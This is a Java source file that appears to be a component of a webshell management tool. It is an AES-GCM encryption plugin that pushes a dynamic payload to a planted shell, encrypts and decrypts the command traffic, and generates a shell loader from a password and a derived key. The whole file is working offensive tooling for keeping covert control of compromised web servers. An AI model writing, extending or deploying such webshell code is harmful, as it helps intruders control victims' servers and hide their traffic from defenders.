package shells.cryptions.JavaAesGcm;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import util.Log;
import util.functions;
import util.http.Http;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.SecureRandom;

/**
 * Java AES-GCM 加密方式
 * GCM模式提供加密和认证,比传统AES更安全
 */
@CryptionAnnotation(
   Name = "JAVA_AES_GCM",
   payloadName = "JavaDynamicPayload"
)
public class JavaAesGcm implements Cryption {
   private ShellEntity shell;
   private Http http;
   private String key;
   private boolean state;
   private byte[] payload;
   
   // GCM参数
   private static final int GCM_IV_LENGTH = 12;  // IV长度
   private static final int GCM_TAG_LENGTH = 128; // 认证标签长度

   public void init(ShellEntity context) {
      this.shell = context;
      this.http = this.shell.getHttp();
      this.key = this.shell.getSecretKeyX();

      try {
         this.payload = this.shell.getPayloadModule().getPayload();
         this.shell.getHeaders().put("Content-Type", "application/octet-stream");
         
         if (this.payload != null) {
            this.http.sendHttpResponse(this.payload);
            this.state = true;
         } else {
            Log.error("payload Is Null");
         }
      } catch (Exception var2) {
         Log.error((Throwable)var2);
      }
   }

   public byte[] encode(byte[] data) {
      try {
         // 生成随机IV
         byte[] iv = new byte[GCM_IV_LENGTH];
         SecureRandom random = new SecureRandom();
         random.nextBytes(iv);
         
         // 初始化GCM加密
         Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
         GCMParameterSpec parameterSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
         SecretKeySpec keySpec = new SecretKeySpec(this.key.getBytes(), "AES");
         cipher.init(Cipher.ENCRYPT_MODE, keySpec, parameterSpec);
         
         // 加密数据
         byte[] encryptedData = cipher.doFinal(data);
         
         // IV + 加密数据组合
         byte[] result = new byte[iv.length + encryptedData.length];
         System.arraycopy(iv, 0, result, 0, iv.length);
         System.arraycopy(encryptedData, 0, result, iv.length, encryptedData.length);
         
         return result;
      } catch (Exception var6) {
         Log.error((Throwable)var6);
         return null;
      }
   }

   public byte[] decode(byte[] data) {
      try {
         // 提取IV
         byte[] iv = new byte[GCM_IV_LENGTH];
         System.arraycopy(data, 0, iv, 0, iv.length);
         
         // 提取加密数据
         byte[] encryptedData = new byte[data.length - GCM_IV_LENGTH];
         System.arraycopy(data, GCM_IV_LENGTH, encryptedData, 0, encryptedData.length);
         
         // 初始化GCM解密
         Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
         GCMParameterSpec parameterSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
         SecretKeySpec keySpec = new SecretKeySpec(this.key.getBytes(), "AES");
         cipher.init(Cipher.DECRYPT_MODE, keySpec, parameterSpec);
         
         // 解密数据
         return cipher.doFinal(encryptedData);
      } catch (Exception var7) {
         Log.error((Throwable)var7);
         return null;
      }
   }

   public boolean isSendRLData() {
      return false;
   }

   public boolean check() {
      return this.state;
   }

   public byte[] generate(String password, String secretKey) {
      // 使用 PBKDF2 派生密钥
      byte[] derivedKey = functions.deriveKeyPBKDF2(secretKey);
      String keyHex = derivedKey != null ? functions.bytesToHex(derivedKey) : functions.SHA(secretKey.getBytes(), "SHA-256");
      return Generate.GenerateShellLoder(password, keyHex, true);
   }
}
